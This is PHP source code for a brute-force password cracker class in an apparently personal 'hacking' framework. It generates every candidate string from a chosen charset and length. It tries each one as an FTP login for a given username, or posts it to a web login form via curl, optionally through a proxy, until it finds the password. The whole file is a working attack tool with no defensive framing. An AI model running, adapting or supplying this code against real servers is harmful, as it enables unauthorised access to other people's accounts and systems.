<?php

namespace framework\hacking;

use framework\Logger;
use framework\network\Ftp;
use framework\net\Curl;

class BruteForce {

    use \framework\debugger\Debug;

    const FTP = 'FTP';
    const SSH = 'SSH';
    const WEB = 'WEB';

    protected $_process = 0;
    protected $_charsetList = '';
    protected $_minLengh = 0;
    protected $_maxLengh = 6;
    protected $_target = null;
    protected $_checked = false;
    protected $_foundValue = null;
    protected $_bruteType = false;
    protected $_bruteTypeOptions = array();
    protected $_ftp = false;
    protected $_curl = false;

    public function __construct($bruteType = self::FTP, $bruteTypeOptions = array()) {
        $this->setBruteType($bruteType);
        $this->_bruteTypeOptions = $bruteTypeOptions;
    }

    public function setBruteType($type) {
        $this->_bruteType = $type;
    }

    public function getBruteType() {
        return $this->_bruteType;
    }

    protected function _setChecked($bool) {
        $this->_checked = $bool;
    }

    public function getChecked() {
        return $this->_checked;
    }

    protected function _setFoundValue($value) {
        $this->_foundValue = $value;
        return $this;
    }

    public function getFoundValue() {
        return $this->_foundValue;
    }

    public function setMinLengh($min) {
        $this->_minLengh = $min;
        return $this;
    }

    public function getMinLengh() {
        return $this->_minLengh;
    }

    public function setMaxLengh($max) {
        $this->_maxLengh = $max;
        return $this;
    }

    public function getMaxLengh() {
        return $this->_maxLengh;
    }

    public function addCharset($charset) {
        // todo check if charset is already defined ...
        $this->_charsetList .= $charset;
        return $this;
    }

    public function getCharsetList() {
        return $this->_charsetList;
    }

    protected function _incrementProcess() {
        $this->_process++;
    }

    public function getProcess() {
        return $this->_process;
    }

    public function start() {
        $this->_bruteForcing($this->getMaxLengh(), $this->getProcess(), '', $this->getCharsetList(), strlen($this->getCharsetList()));
        if (!$this->getChecked())
            Logger::getInstance()->debug('BruteForcing echec, unfound value with ' . $this->getProcess() . ' process');
        else
            Logger::getInstance()->debug('BruteForcing succefull, found value : "' . $this->getFoundValue() . '" in ' . $this->getProcess() . ' process');
    }

    protected function _bruteForcing($maxLengh, $process, $baseString, $charsetList, $charsetListLengh) {
        if ($this->getChecked())
            return true;
        for ($i = 0; $i < $charsetListLengh; $i++) {
            $this->_incrementProcess();
            if (strlen($baseString . $charsetList[$i]) >= $this->getMinLengh()) {
                if ($this->_check($baseString . $charsetList[$i]))
                    return true;
            }
            if ($process < $maxLengh - 1)
                $this->_bruteForcing($maxLengh, $process + 1, $baseString . $charsetList[$i], $charsetList, $charsetListLengh);
        }
    }

    protected function _check($generateValue) {
        if ($this->getChecked())
            return true;
        switch ($this->getBruteType()) {
            case self::FTP:
                if (!$this->_ftp) {
                    $this->_ftp = new Ftp($this->_bruteTypeOptions['host'], 21, 10, false);
                    $this->_ftp->setDebug(true);
                    if (!$this->_ftp->connect()) {
                        $this->_ftp = false;
                        Logger::getInstance()->debug('BruteForce error: connection on ftp server failed');
                        exit;
                    }
                }
                if ($this->_ftp->login($this->_bruteTypeOptions['username'], $generateValue)) {
                    $this->_setChecked(true);
                    $this->_setFoundValue($generateValue);
                    return true;
                }
                else
                    return false;
                break;
            case self::WEB:
                if (!$this->_curl) {
                    $this->_curl = new Curl($this->_bruteTypeOptions['url']);
                    if (isset($this->_bruteTypeOptions['userAgent']))
                        $this->_curl->setUserAgent($this->_bruteTypeOptions['url']);

                    if (isset($this->_bruteTypeOptions['proxy']))
                        $this->_curl->setProxy($this->_bruteTypeOptions['proxy']['host'], $this->_bruteTypeOptions['proxy']['pass'], $this->_bruteTypeOptions['proxy']['port']);
                    if (isset($this->_bruteTypeOptions['formInputs'])) {
                        $inputs = $this->_bruteTypeOptions['formInputs'];
                        foreach ($inputs as $input => $inputValue) {
                            $this->_curl->addArgument($input, $inputValue);
                        }
                    }
                }
                if (isset($this->_bruteTypeOptions['inputCheck']))
                    $this->_curl->addArgument($this->_bruteTypeOptions['inputCheck'], $generateValue);

                $this->_curl->execute(false, true);
                $curlReponse = $this->_curl->getResponse();
                while ($curlReponse == false) {
                    $this->_curl->execute(false, true);
                    $curlReponse = $this->_curl->getResponse();
                }

                $stringPresent = false;
                foreach ($this->_bruteTypeOptions['checkStringsIntoCurlReturn'] as $string) {
                    if (stripos($curlReponse, $string))
                        $stringPresent = true;
                }
                if (!$stringPresent) {
                    $this->_setChecked(true);
                    $this->_setFoundValue($generateValue);
                    Logger::getInstance()->debug('BruteForcing OK, found value : "' . $generateValue . '" with ' . $this->getProcess() . ' process');
                    /* $file = new \SplFileObject('foundvalue.txt', 'w+');
                      if ($file->flock(LOCK_EX)) {
                      $file->fwrite($generateValue);
                      $file->flock(LOCK_UN);
                      } */
                    return true;
                } else {
                    Logger::getInstance()->debug('BruteForcing echec, unfound value : "' . $generateValue . '" with ' . $this->getProcess() . ' process');

                    return false;
                }
                return false;
                break;
            default:
                throw new \Exception('invalid brute type');
                break;
        }
        return false;
    }

}

?>